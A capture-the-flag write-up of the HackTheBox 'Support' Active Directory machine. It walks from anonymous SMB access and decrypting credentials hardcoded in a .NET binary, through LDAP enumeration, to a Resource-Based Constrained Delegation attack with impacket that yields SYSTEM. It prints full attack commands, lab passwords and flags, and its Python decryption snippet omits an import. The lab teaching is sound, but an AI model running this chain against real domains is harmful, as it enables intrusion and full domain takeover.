
# Support

**By Stager** | FashilHack

---
## What is this machine

Support is an easy-difficulty Windows Active Directory machine on HackTheBox. The entire attack chain begins from a single custom .NET binary sitting on an open SMB share. That one file contained hardcoded encrypted credentials, revealed the internal LDAP infrastructure, and gave us our first valid domain user. From there, careful LDAP enumeration exposed a password hidden in a user's `info` attribute, which led to a WinRM shell. Privilege escalation abused a GenericAll ACE held by the `support` user's group over the DC computer object, exploited via Resource-Based Constrained Delegation to land as SYSTEM.

This machine is a perfect example of why custom applications are always the most interesting thing to find during enumeration — and why AD object permissions are just as dangerous as misconfigurations.

---
## Target

```
IP:       10.129.27.67
Domain:   support.htb
DC Name:  DC
OS:       Windows Server 2022
```

---

## Step 1 — Nmap Reconnaissance

Started with a detailed service and version scan:

```bash
sudo nmap -T4 -sV -A -Pn 10.129.27.67
```

![[nmap2.png]]

The scan immediately identified this as a Domain Controller. Key ports:

```
53/tcp   — DNS (Simple DNS Plus)
88/tcp   — Kerberos
135/tcp  — MSRPC
139/tcp  — NetBIOS
389/tcp  — LDAP
445/tcp  — SMB
464/tcp  — kpasswd5
593/tcp  — RPC over HTTP
636/tcp  — LDAPS (tcpwrapped)
3268/tcp — Global Catalog LDAP (Domain: support.htb)
3269/tcp — Global Catalog LDAPS
5985/tcp — WinRM (HTTP)
```

The LDAP banner confirmed the domain as `support.htb` and the site as `Default-First-Site-Name`. WinRM on 5985 is open — if we get the right user credentials, that is our shell.

Added the domain to `/etc/hosts`:

```bash
echo "10.129.27.67 support.htb dc.support.htb" | sudo tee -a /etc/hosts
```

---

## Step 2 — SMB Enumeration

### Listing Shares

Listed available SMB shares with no credentials:

```bash
smbclient -L //support.htb
```

![[smb shares.png]]

The share list revealed a non-standard share: `support-tools`. Everything else (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) is default. `support-tools` with the description "support staff tools" is interesting — accessed it anonymously:

```bash
smbclient //10.129.27.67/support-tools
```

![[./smb anonymous access.png]]

Anonymous read access worked. The share contained several portable utilities and one file that stands out immediately:

```
UserInfo.exe.zip   — custom application, the only non-standard file
```

### Downloading the Target File

The connection kept timing out on the first attempt. Fixed it by raising the timeout:

```bash
smbclient //10.129.27.67/support-tools -t 120
smb: \> get UserInfo.exe.zip
```

![[got a file.png]]

File downloaded successfully. Unzipped to find a .NET executable with its dependencies and config.

---

## Step 3 — Reverse Engineering UserInfo.exe

### Disassembling to IL

`UserInfo.exe` is a .NET Framework 4.8 binary. Rather than installing dotnet tools, used `monodis` which is already available on Kali to disassemble it to readable IL:

```bash
monodis UserInfo.exe > userinfo.il
```

![[decompling exe file to .il file.png]]

### Finding the Encrypted Password

Grepped the IL output for anything related to the password handling:

```bash
grep -A5 -B5 "enc_password" userinfo.il
```

![[pass with encrypted base64.png]]

The IL revealed everything needed:

```
IL_0000:  ldstr "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"  ← base64 encoded password
IL_000f:  ldstr "armando"                                              ← XOR key
```

Also found the LDAP connection details:

```bash
grep -A5 -B5 "ldap" userinfo.il
```

![[username ldap.png]]

```
LDAP://support.htb   ← server
support\\ldap        ← the username the app authenticates as
```

The `getPassword()` function base64-decodes the stored string then XORs it byte-by-byte with the key `armando` cycling. Wrote the decryption manually:

### Decrypting the Password

Also checked if any useful strings could be pulled directly:

```bash
grep -A5 -B5 "enc_password" userinfo.il
```

![[extracting any text called password.png]]

Then decrypted it with Python:

```python
import base64

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"

decrypted = bytes(
    b ^ k ^ 0xDF
    for b, k in zip(enc_password, cycle(key))
)

print(decrypted.decode())
```

![[decrypted.png]]

```
ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

We now have valid credentials for the `ldap` service account that the application uses to bind to Active Directory.

---

## Step 4 — Validating Credentials

Verified the credentials work against SMB using netexec. The IP kept changing between resets so had to try both the IP and hostname variants:

```bash
nxc smb support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

![[identified creds are valid.png]]

`[+]` confirmed — credentials are valid against the domain. Tried WinRM with the `ldap` account immediately but it failed — this is a service account, not a user with remote management access:

```bash
evil-winrm -i 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```


![[evilwinrm no login.png]]

Expected. The `ldap` account is only used for LDAP binds, not interactive logon. Need to find a real user. Moved to LDAP enumeration.

---

## Step 5 — LDAP Enumeration

### Getting All Users with Sensitive Fields

With valid `ldap` credentials, queried the domain for all user accounts and specifically requested the fields where admins sometimes leave notes or passwords:

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D "support\ldap" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" \
  "(objectClass=user)" \
  sAMAccountName description info comment
```

![[found all users in dc by using ldapsearch.png]]

### Extracting a Clean User List

Pulled just the usernames for further attacks:

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D "support\ldap" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" \
  "(objectClass=user)" \
  sAMAccountName | grep sAMAccountName
```

![[ldapsearch get only usernames of samaAccounts.png]]

Cleaned the output with awk:

```bash
awk '{print $2}' validusers.txt > users.txt
```

21 accounts found. Saved to `users.txt` for use with attack tools.

### The Find — Password in the info Field

The full ldapsearch output exposed something critical in the `support` user's entry:

![[creds of support user found in field info.png]]


```
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
sAMAccountName: support
```

The `info` attribute — a non-standard field that BloodHound does not capture — contained a plaintext password. This is a classic AD misconfiguration where administrators leave credentials in user description or info fields.

```
support : Ironside47pleasure40Watchful
```

---

## Step 6 — Dead Ends Before the Shell

Tried AS-REP roasting against the user list — checked if any account had pre-authentication disabled:

```bash
impacket-GetNPUsers -dc-ip 10.129.230.181 support.htb/ldap -no-pass
```

![[arp-roasting no.png]]

No accounts vulnerable. Tried Kerberoasting next — checked for accounts with SPNs:

```bash
impacket-GetUserSPNs -request -dc-ip 10.129.230.181 support.htb/ldap:'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```


![[kerboasting no entries.png]]

No entries found. Both standard Kerberos attacks were dead ends — the password in the `info` field was the intended path.

---

## Step 7 — Shell as support

Tested the `support` credentials against WinRM:

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

![[got shell with support.png]]


Shell landed as `support\support`. Retrieved the user flag from the Desktop:

![[stager/writeups/write-ups/support/user flag.png]]

```
user.txt: 5779cbe2d06a1bf7797f612e2973b6c7
```

---

## Step 8 — Post-Exploitation Enumeration

### Group Membership Discovery

First thing after getting a shell — ran `whoami /all` to see group memberships:

```bash
whoami /all
```

![[run whoami found a non default group.png]]

The output revealed a non-default group:

```
SUPPORT\Shared Support Accounts   Group   Mandatory group, Enabled by default, Enabled group
```

Also confirmed `BUILTIN\Remote Management Users` — which explains why WinRM worked. The `Shared Support Accounts` group is the interesting one — custom groups in AD often have over-permissioned ACEs.

---

## Step 9 — BloodHound Analysis

### Starting BloodHound

Started the BloodHound CE instance via Docker:

```bash
cd ~/.config/bloodhound
docker compose start
```

![[started bloodhound.png]]

### Collecting AD Data
Ran bloodhound-python with the `ldap` credentials to collect all domain data:

```bash
bloodhound-python -c ALL -u ldap \
  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -d support.htb -ns 10.129.27.67
```

![[run bloodhound.png]]


Found 21 users, 53 groups, 1 computer, 2 GPOs. DCE/RPC warnings are expected — the data we need was collected via LDAP. Uploaded all JSON files to the BloodHound UI.

### Finding the Privilege Escalation Path

In BloodHound searched for `Shared Support Accounts` and used pathfinding to `DC.SUPPORT.HTB`:

![[genericall.png]]

**GenericAll** — the `Shared Support Accounts` group has full control over the `DC.SUPPORT.HTB` computer object. Since `support` is a member of this group, we inherit this right. GenericAll on a computer object enables Resource-Based Constrained Delegation (RBCD).

---

## Step 10 — Privilege Escalation via RBCD

The attack requires three steps: create a fake computer account we control, configure the DC to trust it for delegation, then request a service ticket impersonating Administrator.

### Step 1 — Create a Fake Computer Account

```bash
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
  -computer-name 'FAKE$' \
  -computer-pass 'FakePass123!' \
  -dc-ip 10.129.230.181
```


![[create fake computer.png]]


`FAKE$` machine account created successfully with password `FakePass123!`.

### Step 2 — Configure RBCD

Used the GenericAll privilege to write to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the DC — this tells the DC to trust `FAKE$` to impersonate any user:

```bash
impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
  -delegate-from 'FAKE$' \
  -delegate-to 'DC$' \
  -action write \
  -dc-ip 10.129.230.181
```


![[tell dc to trust fake computer.png]]

`Delegation rights modified successfully` — `FAKE$` can now impersonate any user on the DC via S4U2Proxy.

### Step 3 — Get a Service Ticket Impersonating Administrator

Requested a Kerberos service ticket for the CIFS service on the DC, impersonating Administrator:

```bash
impacket-getST support.htb/'FAKE$':'FakePass123!' \
  -spn cifs/dc.support.htb \
  -impersonate Administrator \
  -dc-ip 10.129.230.181
```


![[get TGT.png]]

Ticket saved as `Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`.

### Step 4 — Use the Ticket for a SYSTEM Shell

Exported the ticket as the active Kerberos credential cache then used psexec with Kerberos authentication — no password needed, the ticket is the proof of identity:

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass
```

![[got root.png]]


```
whoami
nt authority\system
```

SYSTEM on the Domain Controller. Retrieved the root flag:

![[stager/writeups/write-ups/support/root flag.png]]

```
root.txt: 6f7cc60a6e13b738c292ec507178fbe0
```

---

## Proof

![[stager/writeups/write-ups/cctv/finished.png]]

**Rank: #10343 | Pwned: 15 Apr 2026 | Machine State: Retired**

---

## The Full Chain

```
nmap → DC identified, WinRM open on 5985
  ↓
smbclient anonymous → support-tools share open
  ↓
UserInfo.exe.zip downloaded
  ↓
monodis decompile → IL shows enc_password + XOR key "armando"
  ↓
Python XOR decrypt → ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
  ↓
nxc smb → credentials valid confirmed
  ↓
evil-winrm as ldap → WinRMAuthorizationError (service account, no shell)
  ↓
ldapsearch with ldap creds → all users + description/info/comment fields
  ↓
support user info field → Ironside47pleasure40Watchful
  ↓
AS-REP roasting → no accounts vulnerable
  ↓
Kerberoasting → no entries found
  ↓
evil-winrm as support → shell, user flag
  ↓
whoami /all → SUPPORT\Shared Support Accounts (non-default group)
  ↓
bloodhound-python → AD data collected
  ↓
BloodHound pathfinding → Shared Support Accounts has GenericAll over DC.SUPPORT.HTB
  ↓
impacket-addcomputer → FAKE$ machine account created
  ↓
impacket-rbcd → DC configured to trust FAKE$ for delegation
  ↓
impacket-getST → service ticket impersonating Administrator obtained
  ↓
impacket-psexec -k → nt authority\system, root flag
```

---

## What I Learned

**Always disassemble custom .NET binaries with monodis.** No dotnet installation needed — monodis is already on Kali and produces readable IL. The IL showed the exact base64 string and XOR key used for password obfuscation. Without looking at the binary, the entire attack chain never starts.

**The `info` field is invisible to BloodHound but visible to ldapsearch.** BloodHound collects many attributes but misses `info`, `comment`, and other non-standard fields. Always run a full ldapsearch with explicit attribute requests after getting valid credentials — `sAMAccountName description info comment` as the attribute list costs nothing and catches credentials that automated tools miss.

**GenericAll on a computer object equals domain admin.** RBCD is one of the most powerful AD primitives. Any group with GenericAll over a computer can impersonate any user against that computer's services — including the Domain Controller itself. When BloodHound shows GenericAll on a computer, assume SYSTEM is reachable.

**Dead ends are part of real enumeration.** AS-REP roasting and Kerberoasting both returned nothing. Running them anyway is correct practice — you confirm paths are closed before moving on. In a real engagement skipping these checks means potentially missing vulnerabilities.

**Service accounts have passwords too.** The `ldap` account had a complex password inside a compiled binary — and that password was the entry point to the entire domain. Custom applications that authenticate to internal services always store credentials somewhere. Finding where is the first job.

---

_Stager — FashilHack — Simulating Attacks, Securing Businesses._